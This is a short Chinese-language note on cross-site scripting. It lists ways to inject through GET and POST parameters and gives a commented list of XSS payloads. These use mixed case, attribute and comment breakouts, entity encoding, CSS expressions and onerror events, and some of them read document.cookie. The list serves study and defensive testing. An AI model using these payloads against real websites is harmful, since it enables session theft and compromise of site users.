什么是XSS攻击
https://www.cnblogs.com/TankXiao/archive/2012/03/21/2337194.html

XSS常见的三种攻击方式
1. 修改GET参数
2. 修改提交表单数据（修改POST参数）


常见攻击形式
```
<script>alert('xss')</script> //默认形式

<ScrIpT>alert("xss")</SCriPt> //变换大小写

"/><script>alert(document.cookie)</script><!--　　// <!-- 表示的意思是 闭合注释

<script>alert(document.cookie)</script><!--

"onclick="alert(document.cookie)

<img src=javascript:alert("xss")></img //变换形式

<img src=j&#97vascript:alert("xss")> //使用ASCII表示

<IMG SRC="jav&#x09;ascript:alert('XSS');" > //插入干扰

<DIV STYLE="width:expression(alert(163));"> //其他属性

<DIV STYLE="xss:expr/*XSS*/ession(alert(163))"> //再干扰

<img src="#" onerror=alert(/xss/)> //借用事件
```
